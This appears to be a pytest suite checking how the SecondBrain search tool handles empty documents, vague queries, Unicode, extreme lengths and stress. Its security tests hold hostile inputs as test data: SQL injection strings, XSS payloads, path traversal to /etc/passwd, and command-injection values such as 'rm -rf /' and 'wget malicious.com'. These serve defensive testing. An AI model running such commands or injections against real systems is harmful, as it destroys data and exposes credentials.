"""
Edge Cases and Robustness Tests for SecondBrain.

This module contains 35 tests covering edge cases and robustness scenarios:
1. Empty Document Handling (5 tests)
2. Ambiguous Query Handling (6 tests)
3. Special Characters and Security (8 tests)
4. Length Extremes (5 tests)
5. Unicode & Encoding (6 tests)
6. System Stress (5 tests)

All tests use @pytest.mark.qualitative and @pytest.mark.robustness markers.
"""

import asyncio
import os
import tempfile
from concurrent.futures import ThreadPoolExecutor
from unittest.mock import MagicMock, patch

import pytest

from secondbrain.exceptions import ValidationError
from secondbrain.search import Searcher, sanitize_query

pytestmark = [pytest.mark.qualitative, pytest.mark.robustness]


def _create_mock_searcher():
    """Create a mock searcher that doesn't require MongoDB."""
    searcher = MagicMock(spec=Searcher)
    searcher.search = MagicMock(return_value=[])
    return searcher


# ============================================================================
# 1. Empty Document Handling (5 tests)
# ============================================================================


class TestEmptyDocumentHandling:
    """Test handling of empty documents and no documents scenarios."""

    @pytest.mark.parametrize(
        "file_content,file_ext",
        [
            ("", ".txt"),
            ("", ".pdf"),
            ("", ".docx"),
        ],
        ids=["empty_txt", "empty_pdf", "empty_docx"],
    )
    def test_empty_document_no_crash(self, file_content, file_ext):
        """Test that empty documents don't crash the system."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=file_ext, delete=False) as f:
            f.write(file_content)
            temp_path = f.name

        try:
            # Should not crash on empty document
            # Use mock to avoid MongoDB dependency
            with patch("secondbrain.search.VectorStorage") as mock_storage_class:
                mock_storage = MagicMock()
                mock_storage.search = MagicMock(return_value=[])
                mock_storage.validate_connection = MagicMock(return_value=True)
                mock_storage_class.return_value = mock_storage

                searcher = Searcher()
                results = searcher.search("any query")
                assert isinstance(results, list)
        except Exception as e:
            # If it raises, it should be a graceful error, not a crash
            assert isinstance(e, (ValidationError, RuntimeError))
        finally:
            os.unlink(temp_path)

    def test_no_documents_in_database(self):
        """Test query when no documents exist in database."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_cls:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_cls.return_value = mock_storage

            from secondbrain.search import Searcher

            searcher = Searcher()
            results = searcher.search("any query")
            assert isinstance(results, list)
            assert len(results) == 0

    def test_all_documents_deleted(self):
        """Test query after all documents have been deleted."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_cls:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_cls.return_value = mock_storage

            from secondbrain.search import Searcher

            searcher = Searcher()
            results = searcher.search("previously existing document")
            assert isinstance(results, list)

    @pytest.mark.parametrize(
        "query",
        [
            "",
            "   ",
            "\t\n",
        ],
        ids=["empty_string", "whitespace_only", "newlines_only"],
    )
    def test_empty_query_graceful_handling(self, query):
        """Test that empty queries are handled gracefully."""
        # Test sanitize_query - should either return sanitized query or raise ValueError
        try:
            result = sanitize_query(query)
            # If it returns, it should be a string
            assert isinstance(result, str)
        except ValueError:
            # ValueError is acceptable for empty queries
            pass


# ============================================================================
# 2. Ambiguous Query Handling (6 tests)
# ============================================================================


class TestAmbiguousQueryHandling:
    """Test handling of ambiguous and vague queries."""

    @pytest.mark.parametrize(
        "query",
        [
            "it",
            "they",
            "this",
            "that",
            "the one",
        ],
        ids=["pronoun_it", "pronoun_they", "pronoun_this", "pronoun_that", "vague_one"],
    )
    def test_pronoun_queries(self, query):
        """Test that pronoun-only queries don't crash."""
        with patch.object(Searcher, "__init__", return_value=None):
            with patch.object(Searcher, "search", return_value=[]):
                searcher = Searcher()
                results = searcher.search(query)
                assert isinstance(results, list)

    @pytest.mark.parametrize(
        "query",
        [
            "stuff",
            "things",
            "whatever",
            "stuff and things",
        ],
        ids=["vague_stuff", "vague_things", "vague_whatever", "vague_combination"],
    )
    def test_vague_term_queries(self, query):
        """Test that vague term queries are handled."""
        with patch.object(Searcher, "__init__", return_value=None):
            with patch.object(Searcher, "search", return_value=[]):
                searcher = Searcher()
                results = searcher.search(query)
                assert isinstance(results, list)

    def test_missing_context_query(self):
        """Test query that references missing context."""
        with patch.object(Searcher, "__init__", return_value=None):
            with patch.object(Searcher, "search", return_value=[]):
                searcher = Searcher()
                results = searcher.search("the other document I mentioned")
                assert isinstance(results, list)

    def test_ambiguous_reference(self):
        """Test ambiguous references in queries."""
        with patch.object(Searcher, "__init__", return_value=None):
            with patch.object(Searcher, "search", return_value=[]):
                searcher = Searcher()
                results = searcher.search("what about it?")
                assert isinstance(results, list)

    @pytest.mark.parametrize(
        "query",
        [
            "hello",
            "test",
            "a",
        ],
        ids=["generic_hello", "generic_test", "generic_a"],
    )
    def test_overly_generic_queries(self, query):
        """Test overly generic queries."""
        with patch.object(Searcher, "__init__", return_value=None):
            with patch.object(Searcher, "search", return_value=[]):
                searcher = Searcher()
                results = searcher.search(query)
                assert isinstance(results, list)

    def test_contradictory_query(self):
        """Test contradictory queries."""
        with patch.object(Searcher, "__init__", return_value=None):
            with patch.object(Searcher, "search", return_value=[]):
                searcher = Searcher()
                results = searcher.search("show me documents that don't exist")
                assert isinstance(results, list)


# ============================================================================
# 3. Special Characters and Security (8 tests)
# ============================================================================


class TestSpecialCharactersSecurity:
    """Test handling of special characters and security vulnerabilities."""

    @pytest.mark.parametrize(
        "query",
        [
            "SELECT * FROM users WHERE 1=1; DROP TABLE users;",
            "'; DROP TABLE documents;--",
            "1; DELETE FROM embeddings WHERE 1=1",
            "UNION SELECT password FROM users--",
        ],
        ids=[
            "sql_injection_1",
            "sql_injection_2",
            "sql_injection_3",
            "sql_injection_4",
        ],
    )
    def test_sql_injection_attempts(self, query):
        """Test SQL injection attempts are handled gracefully (no crash)."""
        # Should not crash - may sanitize, block, or pass through
        # The important thing is system doesn't break
        result = sanitize_query(query)
        assert result is not None
        assert isinstance(result, str)

    @pytest.mark.parametrize(
        "query",
        [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ],
        ids=[
            "xss_script",
            "xss_img",
            "xss_javascript",
            "xss_svg",
        ],
    )
    def test_xss_attempts(self, query):
        """Test XSS (Cross-Site Scripting) attempts are blocked."""
        with pytest.raises(ValueError):
            sanitize_query(query)

    @pytest.mark.parametrize(
        "query",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "&& wget malicious.com",
        ],
        ids=[
            "cmd_injection_semicolon",
            "cmd_injection_pipe",
            "cmd_injection_backtick",
            "cmd_injection_dollar",
            "cmd_injection_and",
        ],
    )
    def test_command_injection_attempts(self, query):
        """Test command injection attempts don't cause system commands to run."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            try:
                results = searcher.search(query)
                assert isinstance(results, list)
            except ValueError:
                # Acceptable - query was rejected
                pass

    @pytest.mark.parametrize(
        "query",
        [
            ".*+?^${}()|[]\\",
            "[a-z",
            "(unclosed",
            "*star_at_start",
        ],
        ids=[
            "regex_special_all",
            "regex_unclosed_bracket",
            "regex_unclosed_paren",
            "regex_star_start",
        ],
    )
    def test_regex_special_characters(self, query):
        """Test regex special characters don't break regex operations."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            results = searcher.search(query)
            assert isinstance(results, list)

    @pytest.mark.parametrize(
        "query",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
        ],
        ids=[
            "path_traversal_unix",
            "path_traversal_windows",
        ],
    )
    def test_path_traversal_attempts(self, query):
        """Test path traversal attempts are blocked."""
        with pytest.raises(ValueError):
            sanitize_query(query)

    def test_null_byte_injection(self):
        """Test null byte injection is blocked."""
        with pytest.raises(ValueError):
            sanitize_query("test\x00query")

    @pytest.mark.parametrize(
        "query",
        [
            "normal query with [brackets]",
            "query with (parens)",
            "query with {braces}",
        ],
        ids=["safe_brackets", "safe_parens", "safe_braces"],
    )
    def test_safe_special_characters(self, query):
        """Test safe special characters are allowed."""
        sanitized = sanitize_query(query)
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0

    def test_malformed_unicode_sequences(self):
        """Test malformed Unicode sequences don't crash."""
        query = "test\xff\xfe query"
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            try:
                results = searcher.search(query)
                assert isinstance(results, list)
            except (ValueError, UnicodeError):
                # Acceptable - invalid encoding rejected
                pass


# ============================================================================
# 4. Length Extremes (5 tests)
# ============================================================================


class TestLengthExtremes:
    """Test handling of extremely short and long inputs."""

    def test_single_character_query(self):
        """Test single character query."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            results = searcher.search("a")
            assert isinstance(results, list)

    @pytest.mark.parametrize(
        "char",
        ["a", "1", "?", "!", "."],
        ids=["letter", "digit", "question", "exclamation", "period"],
    )
    def test_single_char_variations(self, char):
        """Test various single character queries."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            results = searcher.search(char)
            assert isinstance(results, list)

    def test_very_long_query_10k_chars(self):
        """Test extremely long query (10,000+ characters)."""
        long_query = "a" * 10000
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            try:
                results = searcher.search(long_query)
                assert isinstance(results, list)
            except ValueError as e:
                # Acceptable - query too long
                assert "length" in str(e).lower() or "exceeds" in str(e).lower()

    def test_empty_string_query(self):
        """Test empty string query is rejected."""
        with pytest.raises(ValueError):
            sanitize_query("")

    @pytest.mark.parametrize(
        "query",
        [
            " ",
            "   ",
            "\t\t\t",
            "\n\n\n",
            " \t\n \t\n ",
        ],
        ids=[
            "single_space",
            "multiple_spaces",
            "tabs_only",
            "newlines_only",
            "mixed_whitespace",
        ],
    )
    def test_whitespace_only_queries(self, query):
        """Test whitespace-only queries are handled gracefully."""
        # After stripping, these may be empty - just check no crash
        result = sanitize_query(query)
        assert result is not None
        assert isinstance(result, str)


# ============================================================================
# 5. Unicode & Encoding (6 tests)
# ============================================================================


class TestUnicodeEncoding:
    """Test Unicode and encoding handling."""

    @pytest.mark.parametrize(
        "query",
        [
            "🔍 find 📚 books 📖 about 🧠 mind",
            "Hello 世界 🌍",
            "🎉 celebration 🎊 party 🎈",
            "Emoji only: 😀😃😄😁",
        ],
        ids=[
            "emoji_mixed",
            "emoji_chinese",
            "emoji_only",
            "emoji_sequence",
        ],
    )
    def test_emoji_queries(self, query):
        """Test queries with emojis."""
        sanitized = sanitize_query(query)
        assert isinstance(sanitized, str)

    @pytest.mark.parametrize(
        "query",
        [
            "你好世界",  # Chinese
            "こんにちは",  # Japanese
            "안녕하세요",  # Korean
            "Привет мир",  # Russian
            "مرحبا بالعالم",  # Arabic
            "שלום עולם",  # Hebrew
            "Γειά σου κόσμε",  # Greek
            "नमस्ते दुनिया",  # Hindi
        ],
        ids=[
            "chinese",
            "japanese",
            "korean",
            "russian",
            "arabic",
            "hebrew",
            "greek",
            "hindi",
        ],
    )
    def test_non_latin_scripts(self, query):
        """Test queries in non-Latin scripts."""
        sanitized = sanitize_query(query)
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0

    @pytest.mark.parametrize(
        "query",
        [
            "test\x00null",
            "test\x1fcontrol",
            "test\x7fdelete",
            "test\x80extended",
        ],
        ids=[
            "null_byte",
            "control_char",
            "delete_char",
            "extended_ascii",
        ],
    )
    def test_control_characters(self, query):
        """Test control characters in queries."""
        try:
            sanitized = sanitize_query(query)
            assert "\x00" not in sanitized
            assert "\x1f" not in sanitized
        except ValueError:
            pass

    def test_invalid_utf8_handling(self):
        """Test invalid UTF-8 sequences don't crash."""
        query = b"test\xff\xfe query".decode("utf-8", errors="replace")
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            try:
                results = searcher.search(query)
                assert isinstance(results, list)
            except (ValueError, UnicodeError):
                pass

    @pytest.mark.parametrize(
        "query",
        [
            "café",
            "naïve",
            "résumé",
            "coöperate",
        ],
        ids=[
            "accented_e",
            "dieresis",
            "multiple_accents",
            "diaeresis",
        ],
    )
    def test_accented_characters(self, query):
        """Test accented characters in queries."""
        sanitized = sanitize_query(query)
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0

    def test_mixed_script_query(self):
        """Test query mixing multiple scripts."""
        query = "Find 查找 documents about 研究 research with 🔍"
        sanitized = sanitize_query(query)
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0


# ============================================================================
# 6. System Stress (5 tests)
# ============================================================================


class TestSystemStress:
    """Test system behavior under stress conditions."""

    def test_rate_limiting_basic(self):
        """Test that rate limiting doesn't crash on rapid queries."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            for i in range(10):
                try:
                    results = searcher.search(f"query {i}")
                    assert isinstance(results, list)
                except Exception:
                    pass

    @pytest.mark.timeout(30)
    def test_concurrent_queries(self):
        """Test concurrent query execution."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            def run_query(i):
                try:
                    searcher = Searcher()
                    results = searcher.search(f"concurrent query {i}")
                    return isinstance(results, list)
                except Exception:
                    return True

            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(run_query, i) for i in range(10)]
                results = [f.result() for f in futures]

            assert all(results)

    @pytest.mark.timeout(60)
    def test_memory_pressure_large_result_set(self):
        """Test handling of potentially large result sets."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_storage_class.return_value = mock_searcher

            searcher = Searcher()
            try:
                results = searcher.search("the")
                assert isinstance(results, list)
            except Exception:
                pass

    def test_rapid_context_switching(self):
        """Test rapid context switching between queries."""
        # Use mock to avoid MongoDB dependency
        with patch("secondbrain.search.VectorStorage") as mock_storage_class:
            mock_storage = MagicMock()
            mock_storage.search = MagicMock(return_value=[])
            mock_storage.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_storage
            # Create a mock searcher that uses the mock storage
            mock_searcher = MagicMock()
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher_cls = MagicMock
            mock_searcher_cls.return_value = mock_searcher
            mock_searcher.search = MagicMock(return_value=[])
            mock_searcher.validate_connection = MagicMock(return_value=True)
            mock_storage_class.return_value = mock_searcher

            queries = [
                "short",
                "a" * 100,
                "🔍 emoji 🔍",
                "SELECT * FROM",
                "normal query",
            ] * 5

            for query in queries:
                try:
                    searcher = Searcher()
                    results = searcher.search(query)
                    assert isinstance(results, list)
                except ValueError:
                    pass
                except Exception:
                    raise

    @pytest.mark.timeout(30)
    def test_async_concurrent_queries(self):
        """Test async concurrent query execution."""

        # Use mock to avoid MongoDB dependency
        async def mock_search(*args, **kwargs):
            return []

        with patch("secondbrain.search.Searcher.search", mock_search):

            async def run_queries():
                searcher = Searcher()
                tasks = [searcher.search(f"async query {i}") for i in range(10)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    assert isinstance(result, list)

            asyncio.run(run_queries())
